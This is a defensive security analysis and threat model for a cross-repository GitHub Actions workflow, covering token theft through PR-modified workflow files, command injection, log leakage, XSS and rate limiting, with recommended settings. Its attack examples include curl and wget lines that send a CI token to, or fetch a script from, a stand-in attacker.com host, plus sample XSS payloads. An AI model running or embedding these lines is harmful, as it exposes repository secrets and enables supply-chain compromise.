# AI-First Workflow Security Analysis

## 🔒 Security Overview

This document outlines security risks, mitigations, and best practices for the AI-First Workflow operating in public repositories with cross-repo automation.

---

## 🎯 Threat Model

### Attack Surface
- **Public Repository**: Anyone can view workflow code and fork the repository
- **External Contributors**: Non-Microsoft users can submit PRs
- **Cross-Repository Operations**: Workflow operates across 3+ repositories
- **Sensitive Token**: `CROSS_REPO_CODEGEN_TOKEN` has elevated permissions

### Threat Actors
1. **External Malicious Contributors**: Submit PRs to exploit workflow
2. **Compromised Accounts**: Stolen credentials from legitimate users
3. **Supply Chain Attacks**: Dependencies or actions compromised

---

## 🔴 Critical Risks & Mitigations

### 1. **Workflow Code Tampering**

**Risk Level**: 🔴 **CRITICAL** 

**Attack Vector**:
```yaml
# Attacker modifies .github/workflows/ai-first.yml in their PR
- name: Steal token
  env:
    GH_TOKEN: ${{ secrets.CROSS_REPO_CODEGEN_TOKEN }}
  run: |
    # Remove security checks
    # Exfiltrate token to attacker's server
    curl -X POST https://attacker.com/steal -d "token=$GH_TOKEN"
```

**Impact**:
- **Token exfiltration**: Full PAT token compromise
- **Bypass all security checks**: Attacker controls the workflow code
- **Unauthorized operations**: Delete issues, create malicious PRs, access private repos
- **Supply chain attack**: Inject malicious code into downstream repositories

**Why This is Critical**:
When a PR is opened, GitHub Actions **runs the workflow file from the PR branch**, not from the base branch. This means:
- ✅ Attacker can modify the workflow to remove all security checks
- ✅ Attacker can add code to exfiltrate secrets
- ✅ Code-based mitigations (org checks, input validation) can be bypassed
- ✅ Even draft PRs can be used to test exploits locally

**Attack Flow Visualization**:
```
┌─────────────────────────────────────────────────────────────────┐
│ Step 1: Attacker forks repository                               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 2: Attacker modifies .github/workflows/ai-first.yml        │
│   - Removes organization membership check                       │
│   - Adds: curl attacker.com/steal?token=$GH_TOKEN              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 3: Attacker creates PR with:                               │
│   - Modified workflow file                                       │
│   - Small change to src/**.cs file (to trigger workflow)       │
│   - "codegen-experiment" label                                  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 4: WITHOUT repository setting:                             │
│   ❌ Workflow runs immediately with attacker's code             │
│   ❌ CROSS_REPO_CODEGEN_TOKEN exposed to attacker               │
│   ❌ Token sent to attacker.com                                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 5: Attacker now has full token access to:                  │
│   - microsoft/Agent365-dotnet                                   │
│   - microsoft/Agent365-python                                   │
│   - microsoft/Agent365-nodejs                                   │
└─────────────────────────────────────────────────────────────────┘

vs.

┌─────────────────────────────────────────────────────────────────┐
│ WITH repository setting "Require approval":                     │
│   ✅ Workflow shows "Waiting for approval"                      │
│   ✅ Maintainer reviews modified workflow file                  │
│   ✅ Maintainer rejects malicious PR                            │
│   ✅ Token never exposed                                        │
└─────────────────────────────────────────────────────────────────┘
```

**Mitigation** ✅ **REQUIRED - REPOSITORY SETTING**:

**This is the ONLY effective mitigation for this vulnerability:**

Navigate to: **Settings → Actions → General → Fork pull request workflows from outside collaborators**

Select: ☑️ **"Require approval for all outside collaborators"**

This ensures:
- ✅ Workflows from external PRs **do NOT run automatically**
- ✅ A maintainer must **manually review the workflow code** before execution
- ✅ Protection happens at GitHub's infrastructure level (cannot be bypassed by code)
- ✅ Secrets are NOT exposed to unapproved workflow runs

**Status**: ⚠️ **MUST BE CONFIGURED** - Without this setting, all other security measures can be bypassed!

**Additional Defense-in-Depth** (not sufficient alone):
- Branch protection on `main` requiring reviews for workflow changes
- CODEOWNERS file requiring security team approval for `.github/workflows/` changes
- Regular audits of workflow modification PRs

---

### 2. **Command Injection via User Input**

**Risk Level**: 🔴 **HIGH** (Critical if workflow tampering protection is not enabled)

**Attack Vector**:
```yaml
# Malicious PR title or body
Title: "; curl attacker.com/exfiltrate?token=$GH_TOKEN; echo "
Body: `$(wget attacker.com/malware.sh && bash malware.sh)`
```

**Impact**:
- Token exfiltration
- Unauthorized API calls
- Workflow manipulation
- Cross-repo compromise

**Mitigation** ✅ **IMPLEMENTED**:
```yaml
env:
  PR_TITLE: ${{ toJSON(github.event.pull_request.title) }}
  PR_BODY: ${{ toJSON(github.event.pull_request.body) }}
  PR_AUTHOR: ${{ toJSON(github.event.pull_request.user.login) }}

run: |
  # JSON escaping + jq parsing prevents injection
  PR_TITLE=$(echo "$PR_TITLE" | jq -r '.')
  PR_BODY=$(echo "$PR_BODY" | jq -r '.')
  PR_AUTHOR=$(echo "$PR_AUTHOR" | jq -r '.')
```

**Why This Works**:
- `toJSON()` escapes all special characters into valid JSON
- `jq -r '.'` safely parses and extracts the string value
- Prevents shell interpretation of injected commands

---

### 3. **Unauthorized Workflow Execution**

**Risk Level**: 🟡 **MEDIUM** (Mitigated by workflow tampering protection + org check)

**Attack Vector**:
- External contributor (non-Microsoft) submits legitimate PR
- Workflow would run automatically with access to secrets
- Could trigger expensive API operations or spam issues

**Impact**:
- Unauthorized use of PAT token for legitimate but unwanted operations
- API rate limit exhaustion
- Spam in target repositories
- Resource consumption

**Mitigation** ✅ **IMPLEMENTED**:

**1. Organization Membership Check** (Code-based defense):
```yaml
- name: Check if PR author is a bot
  run: |
    # Verify PR author is Microsoft organization member
    ORG_MEMBERSHIP=$(gh api /orgs/microsoft/members/$PR_AUTHOR)
    if [ membership check fails ]; then
      echo "⏭️ Skipping - not a Microsoft org member"
      exit 0
    fi
```

**2. GitHub Repository Settings** (Primary defense):
```
Settings → Actions → General → Fork pull request workflows from outside collaborators:
  ☑️ Require approval for all outside collaborators

Settings → Actions → General → Workflow permissions:
  ⦿ Read repository contents and packages permissions
  ☐ Allow GitHub Actions to create and approve pull requests

Settings → Branches → Branch protection rules for main/master:
  ☑️ Require pull request reviews before merging
  ☑️ Require review from Code Owners
  ☑️ Include administrators
```

**3. CODEOWNERS File** (REQUIRED):
```
# .github/CODEOWNERS
/.github/workflows/ @microsoft/agent365-maintainers
```

**Why This Works**:
- External PRs cannot trigger workflows without approval
- Workflow changes require review from trusted maintainers
- Organization check blocks automated execution for non-members
- Defense in depth: multiple layers of protection

---

### 4. **Token Privilege Escalation**

**Risk Level**: 🟠 **MEDIUM** (Good with Fine-Grained PAT)

**Current State**: ✅ **GOOD**
- Fine-Grained PAT token (`CROSS_REPO_CODEGEN_TOKEN`) with scoped access:
  - Agent365-dotnet (limited permissions)
  - Agent365-python (limited permissions)
  - Agent365-nodejs (limited permissions)
  - Repository-specific scope (not account-wide)

**Attack Vector** (Reduced):
- If token compromised, attacker can:
  - Create malicious issues only in scoped repositories
  - Submit PRs with malicious code (still requires review)
  - Modify existing PRs and issues in scoped repos only
  - No access to other repositories

**Further Improvements** (Optional):

**Option A: Upgrade to GitHub App (BEST - Long-term)**:
```yaml
- uses: actions/create-github-app-token@v1
  with:
    app-id: ${{ secrets.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    repositories: |
      Agent365-dotnet
      Agent365-python
      Agent365-nodejs
```

**Benefits**:
- Scoped permissions per repository
- Automatic token rotation
- Audit trail per app
- Revocable without affecting user account

**Option B: Fine-Grained PAT (CURRENT IMPLEMENTATION)**: ✅
```
Personal Access Token → Fine-grained tokens
  Resource owner: microsoft
  Repository access: Only select repositories
    - Agent365-dotnet
    - Agent365-python  
    - Agent365-nodejs
  Repository permissions:
    - Contents: Read-only (for file access)
    - Issues: Read and write (for issue creation)
    - Pull requests: Read and write (for PR operations)
    - Metadata: Read-only (for repo info)
  Organization permissions:
    - Members: Read (for org membership verification)
  Expiration: 90 days maximum
```

**Current Best Practices**:
- ✅ Token belongs to a service account (not personal)
- ✅ Regular rotation schedule (every 90 days)
- ✅ Repository scope limited to Agent365-* repos only
- ✅ Minimal permissions (no admin, no code write)
- 🔄 Set up monitoring for unusual activity

---

### 5. **Secret Leakage via Logs**

**Risk Level**: 🟠 **MEDIUM**

**Attack Vector**:
- Workflow logs are public in public repositories
- Accidental echoing of secrets
- Error messages containing token fragments

**Examples**:
```bash
# BAD - Token visible in logs
echo "Token: $GH_TOKEN"
gh api /user --verbose  # Shows auth header

# BAD - Error exposes token
curl -H "Authorization: Bearer $GH_TOKEN" invalid-url
# Error: 401 Unauthorized for token ghp_xxxxx...
```

**Mitigation** ✅ **IMPLEMENTED**:

**1. GitHub Automatic Secret Masking**:
- GitHub automatically masks registered secrets in logs
- `***` appears instead of actual value

**2. Minimal Logging**:
```yaml
# GOOD - No token exposure
gh auth status  # Checks auth without showing token
gh api /user --jq '.login'  # Minimal output
```

**3. Secure Error Handling**:
```bash
# GOOD - Suppress token in errors
gh api /endpoint 2>&1 | grep -v "Authorization" || echo "API call failed"

# GOOD - Redirect sensitive operations
gh issue create --title "..." --body "..." 2>/dev/null
```

**4. Log Review**:
- Regularly audit workflow run logs
- Search for patterns: `ghp_`, `gho_`, `Bearer`, `token=`

---

### 6. **Cross-Site Scripting (XSS) in Issues**

**Risk Level**: 🟡 **MEDIUM**

**Attack Vector**:
```markdown
PR Body: <script>alert('XSS')</script>
PR Body: ![image](javascript:alert('XSS'))
PR Body: [click me](javascript:alert('XSS'))
```

When workflow creates issue with unsanitized PR body, XSS payload injected into target repositories.

**Impact**:
- Malicious scripts in issue tracker
- Session hijacking for users viewing issues
- Phishing attacks via crafted links

**Mitigation** ✅ **PARTIAL** (GitHub's responsibility):

**GitHub's Protection**:
- GitHub sanitizes markdown rendering
- JavaScript URLs are blocked
- `<script>` tags are stripped

**Additional Safety**:
```yaml
# Escape special characters in markdown
PR_BODY_ESCAPED=$(echo "$PR_BODY" | sed 's/[<>]/\\&/g')
```

**Recommendation**: Trust GitHub's sanitization, but avoid raw HTML in issue templates.

---

### 7. **Rate Limit Exhaustion (DoS)**

**Risk Level**: 🟡 **MEDIUM**

**Attack Vector**:
- Malicious actor submits many PRs rapidly
- Workflow creates issues for each PR
- GitHub API rate limits exhausted
- Legitimate workflows blocked

**Rate Limits**:
- PAT: 5,000 requests/hour
- GitHub App: 15,000 requests/hour
- Per-repo limits apply

**Mitigation** ✅ **IMPLEMENTED**:

**1. Concurrency Control**:
```yaml
concurrency:
  group: ai-first-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```
- Only one workflow per PR
- New runs cancel old ones

**2. Prerequisites Gating**:
```yaml
- Draft PR check ✅
- Bot check ✅
- Label check ✅
- Organization membership check ✅
```
- Filters out >90% of potential abuse

**3. Monitoring**:
```bash
# Check rate limit status
gh api rate_limit
```

**4. Emergency Response**:
```yaml
# Disable workflow immediately
# Comment out 'on:' section in workflow file
# on:
#   pull_request:
#     ...
```

---

## 🛡️ Defense in Depth Strategy

### Layer 1: Repository Settings
- ✅ Require approval for outside collaborators
- ✅ Branch protection on default branch
- ✅ CODEOWNERS for workflow directory
- ✅ Require status checks

### Layer 2: Workflow Prerequisites
- ✅ Draft PR check
- ✅ Bot check (except Copilot)
- ✅ Label requirement (`codegen-experiment`)
- ✅ Organization membership verification

### Layer 3: Input Validation
- ✅ JSON escaping for all user inputs
- ✅ jq parsing for safe extraction
- ✅ Fallback values on parse errors

### Layer 4: Token Security
- ✅ Minimal scope (issues, PRs only)
- ✅ Stored in GitHub Secrets
- ✅ Automatic masking in logs
- ⚠️ Consider GitHub App for better isolation

### Layer 5: Monitoring & Response
- ✅ Workflow run notifications
- ✅ Public audit log
- ✅ Emergency disable procedure
- ⚠️ Set up alerting for failed runs

---

## ⚙️ Configuration Checklist

### Required Repository Settings

**1. Actions Permissions**:
```
Settings → Actions → General:
  ☑️ Allow microsoft, and select non-microsoft, actions and reusable workflows
  ☑️ Allow actions created by GitHub
  ☑️ Allow actions by Marketplace verified creators

Fork pull request workflows:
  ☑️ Require approval for all outside collaborators ⚠️ CRITICAL
```

**2. Branch Protection**:
```
Settings → Branches → Add rule:
  Branch name pattern: main (or master)
  ☑️ Require pull request reviews before merging
  ☑️ Require review from Code Owners
  ☑️ Require status checks to pass before merging
  ☑️ Require conversation resolution before merging
  ☑️ Include administrators
```

**3. CODEOWNERS**:
```bash
# Create .github/CODEOWNERS
/.github/workflows/ @microsoft/agent365-core-maintainers
/.github/workflows/ai-first.yml @microsoft/agent365-security-team
```

**4. Secret Configuration**:
```
Settings → Secrets and variables → Actions:
  Repository secret: CROSS_REPO_CODEGEN_TOKEN
    Value: Fine-grained PAT with minimal permissions
    Expiration: 90 days maximum
```

---

## 🔍 Security Audit Procedures

### Weekly Review
- [ ] Check workflow run logs for anomalies
- [ ] Review any failed runs
- [ ] Verify no new workflow files added without review

### Monthly Review
- [ ] Audit organization membership changes
- [ ] Review PAT token usage and permissions
- [ ] Check for any security advisories on used actions
- [ ] Verify CODEOWNERS file is up to date

### Quarterly Review
- [ ] Rotate PAT token
- [ ] Full security assessment of workflow
- [ ] Review and update this document
- [ ] Penetration testing (simulate attacks)

---

## 🚨 Incident Response Plan

### If Token Compromised:

**Immediate (< 5 minutes)**:
1. Revoke `CROSS_REPO_CODEGEN_TOKEN` in GitHub settings
2. Disable workflow (comment out `on:` section)
3. Alert security team

**Short-term (< 1 hour)**:
1. Audit all API calls made with compromised token
2. Review all issues/PRs created in past 24 hours
3. Check for unauthorized repository modifications
4. Generate new token with rotated credentials

**Long-term (< 1 day)**:
1. Investigate root cause
2. Update security procedures
3. Re-enable workflow with new token
4. Post-mortem and lessons learned

### If Malicious PR Detected:

**Immediate**:
1. Close PR without merging
2. Block contributor if external
3. Review any workflow runs triggered

**Follow-up**:
1. Report to GitHub Trust & Safety if needed
2. Update organization block list
3. Review similar PRs from same time period

---

## 📋 Best Practices

### For Workflow Maintainers:

1. **Never commit secrets** - Always use GitHub Secrets
2. **Review all user input handling** - Assume all input is malicious
3. **Use `toJSON()` for all external data** - Prevents injection
4. **Test with malicious inputs** - Try edge cases and attacks
5. **Keep actions pinned to SHA** - Prevents supply chain attacks
   ```yaml
   # BAD
   - uses: actions/checkout@v4
   
   # GOOD
   - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
   ```

### For PR Reviewers:

1. **Scrutinize workflow changes** - Any `.github/workflows/` change is security-critical
2. **Verify organization membership** - Check author's Microsoft affiliation
3. **Test in fork first** - Never merge workflow changes untested
4. **Look for**:
   - New secret references
   - Changes to input handling
   - Additions of `curl`, `wget`, external API calls
   - Changes to prerequisites checks

### For Repository Admins:

1. **Restrict secret access** - Limit who can create/modify repository secrets
2. **Enable required reviews** - Never allow direct commits to main
3. **Monitor workflow usage** - Set up alerts for unusual activity
4. **Regular token rotation** - Every 90 days maximum
5. **Audit permissions** - Quarterly review of who has admin access

---

## 🔗 Additional Resources

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Keeping your GitHub Actions secure](https://github.blog/2020-10-22-github-actions-secure-workflows/)
- [GitHub Security Best Practices](https://docs.github.com/en/code-security/getting-started/github-security-features)
- [Fine-grained PAT Documentation](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token)
- [OWASP CI/CD Security Guide](https://owasp.org/www-project-top-10-ci-cd-security-risks/)

---

## 📊 Current Security Posture Summary

| Security Control | Status | Priority | Notes |
|-----------------|--------|----------|-------|
| **Workflow Tampering Protection** | 🔴 **CRITICAL - NOT CONFIGURED** | **P0** | **BLOCKS PUBLIC RELEASE** - Enable "Require approval for all outside collaborators" |
| **Token Type** | ✅ Fine-Grained PAT | P1 | Scoped to 3 repositories only |
| **Input Sanitization** | ✅ Implemented | P1 | JSON escaping + jq parsing |
| **Org Membership Check** | ✅ Implemented | P2 | Blocks external contributors (bypassed if workflow tampered) |
| **CODEOWNERS** | ⚠️ Not Created | P1 | Must create before public release |
| **Branch Protection** | ⚠️ Requires Config | P1 | Must enable required reviews |
| **Token Rotation** | ✅ Scheduled | P2 | 90-day expiration |
| **Monitoring** | 🔄 Recommended | P3 | Set up alerts for failures |

### Risk Assessment After Mitigations

| Risk Category | Severity | Mitigation Status | Depends On |
|--------------|----------|-------------------|------------|
| **Workflow code tampering** | 🔴 **CRITICAL** | 🔴 **NOT MITIGATED** | ⚠️ Requires repository setting |
| Command injection | 🔴 High | ✅ **Mitigated** | Workflow tampering protection |
| Unauthorized execution | 🟡 Medium | ✅ **Mitigated** | Workflow tampering protection |
| Token privilege escalation | 🟠 Medium | ✅ **Mitigated** | Fine-Grained PAT |
| Secret leakage | 🟠 Medium | ✅ **Protected** | GitHub masking |
| XSS in issues | 🟡 Low | ✅ **Protected** | GitHub sanitization |
| Rate limit DoS | 🟡 Low | ✅ **Mitigated** | Concurrency control |

**Overall Risk Level**: 🔴 **UNACCEPTABLE FOR PUBLIC RELEASE** 

⚠️ **BLOCKING ISSUE**: Workflow tampering protection is NOT configured. Without this setting, all other security measures can be bypassed by modifying the workflow file in a PR.

**To make public**: Enable "Require approval for all outside collaborators" in repository settings → Risk level becomes 🟢 **Acceptable**

---

## 📝 Version History

- **v1.1** (2025-12-01): Critical workflow tampering vulnerability identified
  - **IDENTIFIED CRITICAL RISK**: Workflow code can be modified in PRs to bypass all security
  - Elevated workflow tampering to #1 critical risk (blocks public release)
  - Clarified that repository setting "Require approval for all outside collaborators" is MANDATORY
  - Updated risk assessment: Status is 🔴 UNACCEPTABLE until repository setting is enabled
  - Re-prioritized controls: Workflow tampering protection is P0 (blocking)
- **v1.0** (2025-11-25): Initial security analysis
  - Added command injection mitigations (JSON escaping)
  - Implemented organization membership checks
  - Documented defense-in-depth strategy
  - Confirmed Fine-Grained PAT implementation
  - Identified required repository configuration
